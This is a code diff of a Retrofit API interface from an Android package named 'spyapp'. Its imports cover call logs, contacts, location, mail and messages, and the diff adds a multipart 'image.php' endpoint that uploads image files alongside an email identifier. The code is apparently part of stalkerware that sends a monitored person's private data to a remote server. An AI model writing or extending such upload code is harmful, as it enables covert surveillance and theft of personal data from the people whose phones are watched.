@@ -1,11 +1,13 @@
 package kkactive_india.in.spyapp;
 
+import kkactive_india.in.spyapp.ImagesPOJO.ImgBean;
 import kkactive_india.in.spyapp.MainPOJO.MainBean;
 import kkactive_india.in.spyapp.callLogPOJO.callsBean;
 import kkactive_india.in.spyapp.contactPOJO.contactBean;
 import kkactive_india.in.spyapp.locationPOJO.locationBean;
 import kkactive_india.in.spyapp.mailPOJO.mailBean;
 import kkactive_india.in.spyapp.msgPOJO.MsgBean;
+import okhttp3.MultipartBody;
 import retrofit2.Call;
 import retrofit2.http.Body;
 import retrofit2.http.Headers;
@@ -67,6 +69,13 @@ public interface Allapi {
     Call<MsgBean> msgs (
             @Part("email") String m,
             @Part("msg_log") String n
+    );
+
+    @Multipart
+    @POST("image.php")
+    Call<ImgBean> images (
+            @Part("email") String m,
+            @Part MultipartBody.Part file
     );
 
 }
